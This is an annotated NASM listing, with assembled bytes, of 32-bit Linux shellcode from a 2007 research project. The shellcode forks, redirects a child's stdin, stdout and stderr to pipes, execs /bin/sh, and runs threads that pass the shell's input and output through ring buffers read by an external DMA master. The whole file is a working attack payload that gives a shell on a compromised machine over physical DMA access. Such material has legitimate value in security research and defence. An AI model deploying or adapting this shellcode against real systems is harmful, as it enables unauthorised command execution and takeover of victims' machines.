     1                                  ;
     2                                  ; $Id: dmashellcode.s 355 2007-02-07 01:36:33Z lostrace $
     3                                  ;
     4                                  ; dmashellcode.s: communicate with a DMA master via two ringbuffers
     5                                  ;	and relay all data between the master and a forked shell.
     6                                  ;
     7                                  ; Copyright (C) 2007
     8                                  ; losTrace aka "David R. Piegdon"
     9                                  ;
    10                                  ; This program is free software; you can redistribute it and/or modify
    11                                  ; it under the terms of the GNU General Public License version 2, as
    12                                  ; published by the Free Software Foundation.
    13                                  ;
    14                                  ; This program is distributed in the hope that it will be useful,
    15                                  ; but WITHOUT ANY WARRANTY; without even the implied warranty of
    16                                  ; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    17                                  ; GNU General Public License for more details.
    18                                  ;
    19                                  ; You should have received a copy of the GNU General Public License
    20                                  ; along with this program; if not, write to the Free Software
    21                                  ; Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
    22                                  ;
    23                                  
    24                                  BITS 32
    25                                  
    26                                  ;		     #   1   2   3   4   5   6
    27                                  ; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
    28                                  ; syscall return: EAX
    29                                  
    30                                  ;
    31                                  ; http://www.lxhp.in-berlin.de/lhpsyscal.html
    32                                  ;
    33                                  ; all necessary system calls:
    34                                  ; ===========================
    35                                  ;
    36                                  ; clone:	eax: 120
    37                                  ; 		ebx: clone-flags
    38                                  ; 		ecx: ptr to top of (distinct) stack space
    39                                  ; 		edx: ptr to pt_regs or NULL
    40                                  ;
    41                                  ; close:	eax: 6
    42                                  ; 		ebx: fd to close
    43                                  ;
    44                                  ; dup2:	eax: 63
    45                                  ; 		ebx: fd 2 dup
    46                                  ; 		ecx: fd to assign the dup to
    47                                  ;
    48                                  ; execve:	eax: 11
    49                                  ; 		ebx: ptr to string of program path&name
    50                                  ; 		ecx: ptr to argv[]
    51                                  ; 		edx: ptr to envv[]
    52                                  ;
    53                                  ; exit:	eax: 1
    54                                  ; 		ebx: exit code
    55                                  ;
    56                                  ; fcntl:	eax: 55
    57                                  ; 		ebx: fd
    58                                  ; 		ecx: command code
    59                                  ; 		edx: file locks: ptr to writable struct flock
    60                                  ;
    61                                  ; fork:	eax: 2
    62                                  ; 		ebx... are passed to forked process.
    63                                  ;
    64                                  ; kill:	eax: 37
    65                                  ; 		ebx: pid (?)
    66                                  ; 		ecx: signal (?)
    67                                  ; 		SIGKILL = 9
    68                                  ;
    69                                  ; nanosleep:	eax: 162
    70                                  ; 		ebx: ptr to struct timespec
    71                                  ; 		ecx: ptr to alterable struct timespec
    72                                  ;
    73                                  ; read:	eax: 3
    74                                  ; 		ebx: fd
    75                                  ; 		ecx: ptr to buffer
    76                                  ; 		edx: count
    77                                  ;
    78                                  ; write:	eax: 4
    79                                  ; 		ebx: fd
    80                                  ; 		ecx: ptr to buffer
    81                                  ; 		edx: count
    82                                  ;
    83                                  ; pipe:	eax: 42
    84                                  ; 		ebx: ptr to dword[2]
    85                                  ;
    86                                  
    87                                  start:
    88 00000000 E800000000              	call near shcode_start
    89                                  shcode_start:
    90 00000005 5D                      	pop	ebp
    91 00000006 81C501020000            	add	ebp, data_start - shcode_start
    92                                  
    93                                  	; pipe(m2sh)
    94 0000000C 31C0                    	xor	eax,eax
    95 0000000E B02A                    	mov	al,42
    96 00000010 89EB                    	mov	ebx,ebp
    97 00000012 81C316000000            	add	ebx,m2sh_0
    98 00000018 CD80                    	int	0x80
    99                                  
   100 0000001A 85C0                    	test	eax,eax
   101 0000001C 751A                    	jnz	child_dead_interleaved
   102                                  
   103                                  	; pipe(sh2m)
   104                                  ;	EAX is ZERO
   105 0000001E B02A                    	mov	al,42
   106 00000020 89EB                    	mov	ebx,ebp
   107 00000022 81C31E000000            	add	ebx,sh2m_0
   108 00000028 CD80                    	int	0x80
   109                                  
   110 0000002A 85C0                    	test	eax,eax
   111 0000002C 750A                    	jnz	child_dead_interleaved
   112                                  
   113                                  	; fork()
   114                                  ;	EAX is ZERO
   115 0000002E B002                    	mov	al,2
   116 00000030 CD80                    	int	0x80
   117                                  
   118 00000032 85C0                    	test	eax,eax
   119 00000034 7407                    	jz	child
   120 00000036 7957                    	jns	parent			; signed > 0 ?
   121                                  child_dead_interleaved:
   122 00000038 E991010000              	jmp	child_dead
   123                                  
   124                                  child:
   125                                  	; dup2(m2sh[0], 0)   (dup to stdin)
   126                                  ;	EAX is ZERO
   127 0000003D B03F                    	mov	al,63
   128 0000003F 8B9D16000000            	mov	ebx,[ebp+m2sh_0]
   129 00000045 31C9                    	xor	ecx,ecx
   130 00000047 CD80                    	int	0x80
   131                                  
   132 00000049 39C8                    	cmp	eax,ecx
   133 0000004B 753D                    	jne	leave_sh_interleaved
   134                                  
   135                                  	; dup2(sh2m[1], 1)   (dup to stdout)
   136                                  	; for sure: EAX is 0.
   137                                  	;xor	eax,eax
   138 0000004D B03F                    	mov	al,63
   139 0000004F 8B9D22000000            	mov	ebx,[ebp+sh2m_1]
   140 00000055 41                      	inc	ecx
   141 00000056 CD80                    	int	0x80
   142                                  
   143 00000058 39C8                    	cmp	eax,ecx
   144 0000005A 752E                    	jne	leave_sh_interleaved
   145                                  
   146                                  	; dup2(sh2m[1], 2)   (dup to stderr)
   147 0000005C 31C0                    	xor	eax,eax
   148 0000005E B03F                    	mov	al,63
   149                                  ;	mov	ebx,[ebp+sh2m_1]
   150 00000060 41                      	inc	ecx
   151 00000061 CD80                    	int	0x80
   152                                  
   153 00000063 39C8                    	cmp	eax,ecx
   154 00000065 7523                    	jne	leave_sh_interleaved
   155                                  
   156                                  	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
   157 00000067 31C0                    	xor	eax,eax
   158 00000069 B00B                    	mov	al,11
   159 0000006B 89EB                    	mov	ebx,ebp
   160 0000006D 81C309000000            	add	ebx,execve_command		; ebx -> '/bin/sh',0
   161                                  
   162 00000073 89E9                    	mov	ecx,ebp
   163 00000075 81C126020000            	add	ecx,foo				; ecx -> foo
   164                                  
   165 0000007B 31D2                    	xor	edx,edx
   166 0000007D 8919                    	mov	[ecx],ebx			; foo := @'/bin/sh',0
   167 0000007F 895104                  	mov	[ecx+4],edx			; bar := NULL
   168 00000082 89CA                    	mov	edx,ecx
   169 00000084 42                      	inc	edx
   170 00000085 42                      	inc	edx
   171 00000086 42                      	inc	edx
   172 00000087 42                      	inc	edx				; edx -> bar
   173 00000088 CD80                    	int	0x80
   174                                  
   175                                  	; fail if execve did not work.
   176                                  leave_sh_interleaved:
   177 0000008A E970010000              	jmp	leave_sh
   178                                  
   179                                  parent:
   180                                  	; remember child's PID
   181 0000008F 898512000000            	mov	[ebp+child_pid],eax
   182                                  
   183                                  	; close(m2sh[0])
   184 00000095 31C0                    	xor	eax,eax
   185 00000097 B006                    	mov	al,6
   186 00000099 8B9D16000000            	mov	ebx,[ebp+m2sh_0]
   187 0000009F CD80                    	int	0x80
   188                                  
   189                                  	; close(sh2m[1])
   190 000000A1 31C0                    	xor	eax,eax
   191 000000A3 B006                    	mov	al,6
   192 000000A5 8B9D22000000            	mov	ebx,[ebp+sh2m_1]
   193 000000AB CD80                    	int	0x80
   194                                  
   195                                  	; clone:
   196                                  	; one thread for reader, one thread for writer
   197 000000AD 31C0                    	xor	eax,eax
   198 000000AF B078                    	mov	al,120
   199                                  	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
   200                                  	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
   201                                  	; CLONE_PTRACE = 0x00002000
   202 000000B1 BB000F0100              	mov	ebx,0x00010f00
   203 000000B6 89E1                    	mov	ecx,esp	; just use same stack with a delta of 64
   204 000000B8 81EC40000000            	sub	esp,64 ; we need the stack only a tiny bit.
   205 000000BE 31D2                    	xor	edx,edx
   206 000000C0 CD80                    	int	0x80
   207                                  
   208 000000C2 85C0                    	test	eax,eax
   209                                  	; ret=0 -> clone
   210 000000C4 7407                    	jz	thread_write_to_master_interleaved	; clone is writer
   211                                  	; ret>0 (signed) -> original
   212 000000C6 790A                    	jns	thread_read_from_master			; original is reader
   213                                  	; error if ret<0
   214 000000C8 E901010000              	jmp	child_dead
   215                                  
   216                                  thread_write_to_master_interleaved:
   217 000000CD E983000000              	jmp	thread_write_to_master
   218                                  
   219                                  	; ==================================== the READER thread:
   220                                  thread_read_from_master:
   221                                  	; will write to child via m2sh[1]
   222                                  	; remember RINGBUFFER from_master in esi
   223 000000D2 89EE                    	mov	esi,ebp
   224 000000D4 81C626000000            	add	esi,rfrm_buffer
   225                                  
   226                                  reader_while_fds_ok:
   227                                  	; while both FDs are ok:
   228 000000DA 8A8503000000            	mov	al,[ebp+to_child_ok]
   229 000000E0 028504000000            	add	al,[ebp+from_child_ok]
   230 000000E6 3C02                    	cmp	al,2
   231 000000E8 7547                    	jne	leave_sh_second_interleaved
   232                                  
   233                                  	; test, if master requested child to be terminated
   234 000000EA 8A8502000000            	mov	al,[ebp+terminate_child]
   235 000000F0 84C0                    	test	al,al
   236 000000F2 7549                    	jnz	do_terminate_child
   237                                  
   238                                  	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
   239 000000F4 31C0                    	xor	eax,eax
   240 000000F6 8A8505000000            	mov	al,[ebp+rfrm_writer_pos]
   241 000000FC 2A8506000000            	sub	al,[ebp+rfrm_reader_pos]
   242 00000102 7432                    	jz	reader_sleep
   243                                  
   244                                  	; EAX/AL is the number of bytes to be written to the child.
   245                                  
   246                                  	; write a single byte to the child.
   247 00000104 31C0                    	xor	eax,eax
   248 00000106 B004                    	mov	al,4
   249 00000108 8B9D1A000000            	mov	ebx,[ebp+m2sh_1]	; EBX := m2sh[1]
   250 0000010E 31C9                    	xor	ecx,ecx
   251 00000110 8A8D06000000            	mov	cl,[ebp+rfrm_reader_pos]
   252 00000116 01F1                    	add	ecx,esi			; ECX := reader_pos + buffer_base
   253 00000118 31D2                    	xor	edx,edx
   254 0000011A 42                      	inc	edx			; EDX := 1
   255 0000011B CD80                    	int	0x80
   256                                  
   257                                  	; we wrote 1 byte, thus syscall should return 1 in EAX.
   258 0000011D 48                      	dec	eax
   259 0000011E 7409                    	jz	reader_write_to_child_ok
   260                                  
   261 00000120 C6850300000000          	mov byte [ebp+to_child_ok], 0
   262 00000127 EBB1                    	jmp	reader_while_fds_ok
   263                                  
   264                                  reader_write_to_child_ok:
   265                                  	; mark byte as read:
   266 00000129 FE8506000000            	inc byte [ebp+rfrm_reader_pos]
   267 0000012F EBA9                    	jmp	reader_while_fds_ok
   268                                  
   269                                  leave_sh_second_interleaved:
   270 00000131 E9C9000000              	jmp	leave_sh
   271                                  
   272                                  reader_sleep:
   273 00000136 E876000000              	call	sleep_short
   274 0000013B EB9D                    	jmp	reader_while_fds_ok
   275                                  
   276                                  do_terminate_child:
   277                                  	; reset flag
   278 0000013D 31C0                    	xor	eax,eax
   279 0000013F 888502000000            	mov	[ebp+terminate_child],al
   280                                  	; send a SIGKILL to child
   281 00000145 B025                    	mov	al,37
   282 00000147 8B9D12000000            	mov	ebx,[ebp+child_pid]
   283 0000014D 31C9                    	xor	ecx,ecx
   284 0000014F B109                    	mov	cl,9	; SIGKILL
   285 00000151 CD80                    	int	0x80
   286                                  
   287                                  ;	; clear to_child_ok
   288                                  ;	xor	eax,eax
   289                                  ;	mov	[ebp+to_child_ok], eax
   290                                  ;	; and from_child_ok
   291                                  ;	mov	[ebp+from_child_ok], eax
   292                                  ;	jmp	leave_sh
   293                                  
   294                                  	; don't terminate, wait for child to close pipes. maybe it just relays the signal to other child.
   295 00000153 EB85                    	jmp	reader_while_fds_ok
   296                                  
   297                                  	; ==================================== the WRITER thread:
   298                                  thread_write_to_master:
   299                                  	; will read from child via sh2m[0]
   300                                  	; remember RINGBUFFER to_master in esi
   301 00000155 89EE                    	mov	esi,ebp
   302 00000157 81C626010000            	add	esi,rto_buffer
   303                                  
   304                                  writer_while_fds_ok:
   305                                  	; while both FDs are ok:
   306 0000015D 8A8503000000            	mov	al,[ebp+to_child_ok]
   307 00000163 028504000000            	add	al,[ebp+from_child_ok]
   308 00000169 3C02                    	cmp	al,2
   309 0000016B 7561                    	jne	child_dead
   310                                  
   311                                  	; if ringbuffer is FULL ( _reader == _writer+1 ), do nothing.
   312 0000016D 8A8507000000            	mov	al,[ebp+rto_writer_pos]
   313 00000173 FEC0                    	inc	al
   314 00000175 2A8508000000            	sub	al,[ebp+rto_reader_pos]
   315 0000017B 742D                    	jz	writer_sleep
   316                                  
   317                                  	; read ONE SINGLE BYTE and pass it into the buffer.
   318 0000017D 31C0                    	xor	eax,eax
   319 0000017F B003                    	mov	al,3
   320 00000181 8B9D1E000000            	mov	ebx,[ebp+sh2m_0]
   321 00000187 31C9                    	xor	ecx,ecx
   322 00000189 8A8D07000000            	mov	cl,[ebp+rto_writer_pos]
   323 0000018F 01F1                    	add	ecx,esi
   324 00000191 31D2                    	xor	edx,edx
   325 00000193 42                      	inc	edx
   326 00000194 CD80                    	int	0x80
   327                                  
   328                                  	; we read one byte. syscall should return 1 in EAX.
   329 00000196 48                      	dec	eax
   330 00000197 7409                    	jz	writer_read_from_child_ok
   331                                  
   332 00000199 C6850400000000          	mov byte [ebp+from_child_ok],0
   333 000001A0 EBBB                    	jmp	writer_while_fds_ok
   334                                  
   335                                  writer_read_from_child_ok:
   336 000001A2 FE8507000000            	inc byte [ebp+rto_writer_pos]
   337                                  
   338                                  	; we don't need to sleep inside the loop. only sleep, if ringbuffer is full.
   339                                  	; read() will block if there is no data from child.
   340 000001A8 EBB3                    	jmp	writer_while_fds_ok
   341                                  
   342                                  writer_sleep:
   343 000001AA E802000000              	call	sleep_short
   344 000001AF EBAC                    	jmp	writer_while_fds_ok
   345                                  
   346                                  	; ==================================================================
   347                                  
   348                                  sleep_short:
   349                                  	; sleep 0.001 seconds:
   350                                  	; usleep(0,1000000);
   351 000001B1 31C0                    	xor	eax,eax
   352 000001B3 B0A2                    	mov	al, 162
   353 000001B5 89EB                    	mov	ebx, ebp
   354 000001B7 81C326020000            	add	ebx, foo
   355 000001BD 89D9                    	mov	ecx, ebx
   356 000001BF 31D2                    	xor	edx,edx
   357 000001C1 8913                    	mov long [ebx], edx		; seconds
   358 000001C3 BAA0860100              	mov	edx,100000
   359 000001C8 895304                  	mov long [ebx+4], edx		; nanoseconds
   360 000001CB CD80                    	int	0x80
   361                                  
   362 000001CD C3                      	ret
   363                                  
   364                                  child_dead:
   365                                  	; at most wait 2 seconds for master's ACK
   366 000001CE 31C0                    	xor	eax,eax
   367 000001D0 388501000000            	cmp	[ebp+child_is_dead_ACK], al
   368 000001D6 7527                    	jne	leave_sh
   369 000001D8 B002                    	mov	al,2
   370 000001DA 388500000000            	cmp	[ebp+child_is_dead], al
   371 000001E0 771D                    	ja	leave_sh
   372                                  
   373 000001E2 FE4500                  	inc byte [ebp]
   374                                  
   375                                  	; usleep(1,0):
   376 000001E5 31C0                    	xor	eax,eax
   377 000001E7 B0A2                    	mov	al, 162
   378 000001E9 89EB                    	mov	ebx, ebp
   379 000001EB 81C326020000            	add	ebx, foo
   380 000001F1 89D9                    	mov	ecx, ebx
   381 000001F3 31D2                    	xor	edx,edx
   382 000001F5 895304                  	mov long [ebx+4], edx		; nanoseconds
   383 000001F8 42                      	inc	edx
   384 000001F9 8913                    	mov long [ebx], edx		; seconds
   385 000001FB CD80                    	int	0x80
   386                                  
   387 000001FD EBCF                    	jmp	child_dead
   388                                  
   389                                  leave_sh:
   390                                  	; exit-point for BOTH parent:writer&reader and child in case of fail
   391 000001FF 31C0                    	xor	eax,eax
   392 00000201 89C3                    	mov	ebx,eax
   393 00000203 40                      	inc	eax
   394 00000204 CD80                    	int	0x80
   395                                  
   396                                  ; =============================================================================
   397                                  ; DATA
   398                                  data_start EQU $
   399                                  
   400                                  ; do not change order of the following stuff!
   401                                  
   402                                  child_is_dead EQU $ - data_start
   403 00000206 00                      	db		0
   404                                  child_is_dead_ACK EQU $ - data_start
   405 00000207 00                      	db		0
   406                                  
   407                                  terminate_child	EQU $ - data_start
   408 00000208 00                      	db		0
   409                                  
   410                                  to_child_ok EQU $ - data_start
   411 00000209 01                      	db		1
   412                                  from_child_ok EQU $ - data_start
   413 0000020A 01                      	db		1
   414                                  
   415                                  ; a ringbuffer is EMPTY, if both _writer and _reader point to the same location.
   416                                  ; a ringbuffer is FULL, if _reader == _writer+1
   417                                  
   418                                  ; ringbuffer from_master:
   419                                  
   420                                  rfrm_writer_pos EQU $ - data_start
   421 0000020B 00                      	db		0
   422                                  rfrm_reader_pos EQU $ - data_start
   423 0000020C 00                      	db		0
   424                                  
   425                                  ; ringbuffer to_master:
   426                                  
   427                                  rto_writer_pos EQU $ - data_start
   428 0000020D 00                      	db		0
   429                                  rto_reader_pos EQU $ - data_start
   430 0000020E 00                      	db		0
   431                                  
   432                                  execve_command EQU $ - data_start
   433 0000020F 2F62696E2F736800        	db	'/bin/sh',0
   434                                  
   435                                  ; =============================================================================
   436                                  ; stuff that is not required to be initialized:
   437 00000217 90                      align 4
   438                                  
   439                                  child_pid EQU $ - data_start
   440                                  
   441                                  ; pipes middleman<->shell
   442                                  m2sh_0 EQU $ - data_start + 4			; shell reads
   443                                  m2sh_1 EQU $ - data_start + 8			; master writes
   444                                  sh2m_0 EQU $ - data_start + 12			; master reads
   445                                  sh2m_1 EQU $ - data_start + 16			; shell writes
   446                                  
   447                                  rfrm_buffer EQU $ - data_start + 20		; FROM master
   448                                  rto_buffer EQU $ - data_start + 276		; TO master
   449                                  
   450                                  foo EQU $ - data_start + 532
   451                                  bar EQU $ - data_start + 536
   452                                  
